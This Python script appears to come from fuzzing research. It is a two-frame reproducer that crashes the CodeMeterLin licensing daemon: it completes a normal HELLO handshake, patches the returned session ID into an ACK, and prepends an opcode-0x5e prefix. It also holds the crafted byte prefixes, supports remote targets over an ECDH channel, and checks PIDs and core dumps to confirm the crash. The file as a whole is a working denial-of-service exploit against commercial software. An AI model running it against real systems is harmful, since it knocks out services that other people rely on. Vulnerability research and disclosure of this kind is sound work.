#!/usr/bin/env python3
"""Two-frame reproducer for the ACK-side opcode-0x5e crash.

This is the ACK analogue of repro_prefixed_hello.py:

1. Send a normal, fresh-token HELLO.
2. Decrypt the daemon response and extract SID0.
3. Patch SID0 into the canonical 8-byte ACK.
4. Send a mutated ACK cleartext:

       5e 00 ... 00 || canonical ACK with fresh SID0

The default prefix is the simpler zero-tail candidate from the ECDH prefix
campaign:

    5e 00 00 00 00 00 00 00 00 00 00 00 00 00 00

so the final ACK plaintext has this shape:

    5e 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0b 00 00 00 XX XX XX XX

where XX XX XX XX is the live SID returned by the current daemon.

Use --prefix or --sample-prefix to test alternatives, for example:

    --prefix 5e
    --prefix 5e00000000000000000000000000
    --prefix 5e0000000000000000000000000000
    --sample-prefix 0

For loopback targets this uses the time-derived PSK channel by default. For
non-loopback targets it uses the ECDH-selected application channel by default,
matching the standalone HELLO/ACK reproducers.

This intentionally crashes CodeMeterLin on vulnerable targets.
"""

from __future__ import annotations

import argparse
import importlib.util
import os
from pathlib import Path
import socket
import subprocess
import sys
import time

from repro_prefixed_hello import (
    decrypt_ecdh_response,
    do_ecdh_handshake,
    encrypt_ecdh_payload,
    is_loopback_target,
    recv_samc_payload,
    resolve_channel,
    send_samc_payload,
)


# Default minimized ACK-side candidate: opcode 0x5e plus fourteen zero bytes.
# Each prefix is prepended before the canonical 8-byte ACK after SID patching.
DEFAULT_ACK_PREFIX_HEX = "5e0000000000000000000000000000"

# Captured random-tail farm candidates retained for comparison.
SAMPLE_ACK_PREFIXES = [
    "5e8d0aae35944011f88e1414c1a6bb",
    "5e756de599689e5d5345e153887656",
    "5ef12e17f59c10ce27b49c8ade1dc3",
]


def load_samc(helper_path: Path):
    """Import the SAMC helper module used by the fuzzer.

    The helper supplies captured canonical plaintexts plus the transport
    crypto/framing routines. The vulnerable input is the decrypted ACK
    plaintext assembled in this file; the helper only makes the daemon accept
    the frame as a valid SAMC client-to-daemon message.
    """
    helper_path = helper_path.resolve()
    sys.path.insert(0, str(helper_path.parent))
    spec = importlib.util.spec_from_file_location("samc_fuzz_for_ack_repro", helper_path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot import {helper_path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def codemeter_pid() -> int | None:
    """Return the real CodeMeterLin PID, or None if the daemon is gone."""
    try:
        out = subprocess.check_output(["pgrep", "-x", "CodeMeterLin"], text=True, timeout=1)
    except Exception:
        return None
    pids = [int(tok) for tok in out.split() if tok.isdigit()]
    return pids[0] if pids else None


def newest_core() -> tuple[str, int, int] | None:
    """Return the newest local CodeMeter core-like file."""
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def recv_decrypted_response(samc, sock: socket.socket, timeout: float) -> bytes | None:
    """Receive one daemon-to-client frame and return decrypted plaintext."""
    resp = samc.recv_one_wire_frame(sock, timeout=timeout)
    if resp is None:
        return None
    return samc.decrypt_d2c_frame(resp, int(time.time()))


def recv_response_inner(
    samc,
    sock: socket.socket,
    timeout: float,
    channel: str,
    ecdh_key: bytes | None = None,
    ecdh_iv: bytes | None = None,
) -> bytes | None:
    if channel == "psk":
        return recv_decrypted_response(samc, sock, timeout)
    if channel == "ecdh":
        if ecdh_key is None or ecdh_iv is None:
            raise ValueError("ECDH response decrypt requires key and iv")
        payload = recv_samc_payload(sock, timeout)
        return decrypt_ecdh_response(payload, ecdh_key, ecdh_iv)
    raise AssertionError(f"unexpected channel: {channel}")


def print_ack_explanation(prefix: bytes, canonical_ack: bytes, mutated_ack: bytes,
                          token: bytes, sid: bytes) -> None:
    print("=== cleartext mutation ===")
    print(f"fresh_client_token={token.hex()}")
    print(f"sid0={sid.hex()}")
    print(f"prefix_hex={prefix.hex()}")
    print(f"prefix_len={len(prefix)}")
    print(f"canonical_ack_len={len(canonical_ack)}")
    print(f"canonical_ack_hex={canonical_ack.hex()}")
    print(f"mutated_ack_len={len(mutated_ack)}")
    print(f"mutated_ack_hex={mutated_ack.hex()}")
    print(f"mutated_ack_starts_with_0x5e={bool(mutated_ack) and mutated_ack[0] == 0x5e}")
    print(f"canonical_ack_tail_offset=0x{len(prefix):x}")
    print()
    print("Interpretation:")
    print("  The HELLO is unmodified except for its normal fresh client token.")
    print("  The daemon-issued SID is patched into the canonical ACK at offset 4.")
    print("  The ACK plaintext is then prefixed so byte 0 is opcode 0x5e.")
    print("  Farm and direct repro crashes with this shape reached CodeMeterLin+0x8f431d.")
    print()


def main() -> int:
    default_helper = Path(__file__).with_name("samc_fuzz.py")
    ap = argparse.ArgumentParser(
        description="Send normal HELLO, then a crafted ACK whose first byte is 0x5e.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 fuzzer/repro_ack_0x5e.py
  python3 fuzzer/repro_ack_0x5e.py --host vistrrdslin0004.vi.vector.int
  python3 fuzzer/repro_ack_0x5e.py --prefix 5e00000000000000000000000000
  python3 fuzzer/repro_ack_0x5e.py --sample-prefix 1
  python3 fuzzer/repro_ack_0x5e.py --prefix 5e
  python3 fuzzer/repro_ack_0x5e.py --prefix 5e0000000000000000000000000000
""",
    )
    ap.add_argument("--samc-helper", default=str(default_helper),
                    help="path to samc_fuzz.py providing crypto/session helpers")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=22350)
    ap.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
                    help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
    ap.add_argument("--prefix", default=None,
                    help="hex bytes to prepend before the SID-patched canonical ACK")
    ap.add_argument("--sample-prefix", type=int, choices=[0, 1, 2], default=None,
                    help="captured random-tail ACK prefix to use instead of the default zero-tail prefix")
    ap.add_argument("--response-timeout", type=float, default=2.0)
    ap.add_argument("--wait", type=float, default=10.0,
                    help="seconds to wait for PID/core crash evidence after ACK send")
    ap.add_argument("--no-crash-oracle", action="store_true",
                    help="do not inspect the local CodeMeter PID/core state")
    args = ap.parse_args()

    samc = load_samc(Path(args.samc_helper))
    channel = resolve_channel(args.channel, args.host)
    local_crash_oracle = is_loopback_target(args.host) and not args.no_crash_oracle

    if args.prefix is not None:
        prefix_hex = args.prefix
    elif args.sample_prefix is not None:
        prefix_hex = SAMPLE_ACK_PREFIXES[args.sample_prefix]
    else:
        prefix_hex = DEFAULT_ACK_PREFIX_HEX
    prefix = bytes.fromhex(prefix_hex)
    if not prefix:
        raise SystemExit("--prefix must not be empty")
    if prefix[0] != 0x5e:
        print(f"warning: prefix starts with 0x{prefix[0]:02x}, not 0x5e", file=sys.stderr)

    before_pid = codemeter_pid() if local_crash_oracle else None
    before_core = newest_core() if local_crash_oracle else None

    token = os.urandom(samc.HELLO_TOKEN_LEN)
    hello = samc.substitute_token(0, samc.CAPTURED_SESSION_C2D[0], token)

    print("=== daemon baseline ===")
    print(f"target={args.host}:{args.port}")
    print(f"channel={channel}")
    print(f"local_crash_oracle={local_crash_oracle}")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()

    sock = socket.create_connection((args.host, args.port), timeout=args.response_timeout)
    try:
        ecdh_key: bytes | None = None
        ecdh_iv: bytes | None = None
        if channel == "ecdh":
            print("=== ecdh ===")
            ecdh_key, ecdh_iv, ecdh_response = do_ecdh_handshake(sock, args.response_timeout)
            print(f"server_point={ecdh_response[8:65].hex()}")
            print(f"key={ecdh_key.hex()}")
            print(f"iv={ecdh_iv.hex()}")
            print()

        print("=== send HELLO ===")
        if channel == "psk":
            hello_wire = samc.encrypt_c2d_frame(hello, int(time.time()))
        elif channel == "ecdh":
            assert ecdh_key is not None and ecdh_iv is not None
            hello_wire = encrypt_ecdh_payload(hello, ecdh_key, ecdh_iv)
        else:
            raise AssertionError(channel)
        print(f"hello_plaintext_len={len(hello)}")
        print(f"hello_wire_len={len(hello_wire)}")
        if channel == "psk":
            sock.sendall(hello_wire)
        else:
            send_samc_payload(sock, hello_wire)

        hello_inner = recv_response_inner(
            samc,
            sock,
            args.response_timeout,
            channel,
            ecdh_key,
            ecdh_iv,
        )
        print(f"hello_response_inner_len={None if hello_inner is None else len(hello_inner)}")
        if hello_inner is None or len(hello_inner) < 8:
            print("cannot extract SID0 from HELLO response; aborting before ACK")
            return 2

        sid = bytes(hello_inner[4:8])
        canonical_ack = samc.apply_sid_patches(1, samc.CAPTURED_SESSION_C2D[1], [sid])
        mutated_ack = prefix + canonical_ack
        print_ack_explanation(prefix, canonical_ack, mutated_ack, token, sid)

        print("=== send ACK ===")
        if channel == "psk":
            ack_wire = samc.encrypt_c2d_frame(mutated_ack, int(time.time()))
        elif channel == "ecdh":
            assert ecdh_key is not None and ecdh_iv is not None
            ack_wire = encrypt_ecdh_payload(mutated_ack, ecdh_key, ecdh_iv)
        else:
            raise AssertionError(channel)
        print(f"ack_wire_len={len(ack_wire)}")
        if channel == "psk":
            sock.sendall(ack_wire)
        else:
            send_samc_payload(sock, ack_wire)

        try:
            ack_inner = recv_response_inner(
                samc,
                sock,
                args.response_timeout,
                channel,
                ecdh_key,
                ecdh_iv,
            )
            print(f"ack_response_inner_len={None if ack_inner is None else len(ack_inner)}")
            if ack_inner is not None:
                print(f"ack_response_inner_hex={ack_inner.hex()}")
        except Exception as exc:
            print(f"ack_recv_exception={type(exc).__name__}:{exc}")
    finally:
        sock.close()

    if local_crash_oracle:
        deadline = time.time() + args.wait
        while time.time() < deadline:
            after_pid = codemeter_pid()
            after_core = newest_core()
            if after_pid != before_pid or after_core != before_core:
                break
            time.sleep(0.25)
        after_pid = codemeter_pid()
        after_core = newest_core()
        crashed = after_pid != before_pid or after_core != before_core
    else:
        after_pid = None
        after_core = None
        crashed = False
    print()
    print("=== crash oracle ===")
    print(f"local_crash_oracle={local_crash_oracle}")
    if local_crash_oracle:
        print(f"after_pid={after_pid}")
        print(f"after_core={after_core}")
        print(f"crashed={crashed}")
    else:
        print("No local PID/core check was run for this target.")
    if crashed or not local_crash_oracle:
        print()
        print("Expected GDB facts for the resulting core:")
        print("  #1 CodeMeterLin + 0x8f431d")
        print("  ACK cleartext byte 0 = 0x5e")
    return 0 if (crashed or not local_crash_oracle) else 1


if __name__ == "__main__":
    raise SystemExit(main())
